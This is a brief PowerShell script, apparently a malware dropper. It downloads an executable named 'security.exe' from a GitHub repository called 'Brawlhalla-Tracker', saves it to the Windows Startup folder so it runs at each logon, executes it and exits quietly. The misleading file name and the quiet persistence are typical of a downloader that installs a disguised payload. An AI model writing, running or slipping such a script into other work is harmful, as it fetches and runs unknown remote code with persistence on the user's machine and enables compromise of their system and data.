$startupFolder = [Environment]::GetFolderPath("Startup")
$url = "https://github.com/FCsab/Brawlhalla-Tracker/raw/refs/heads/main/security.exe"
$outputPath = Join-Path $startupFolder "security.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

& $outputPath
Start-Sleep -Seconds 3
[System.Environment]::Exit(0)
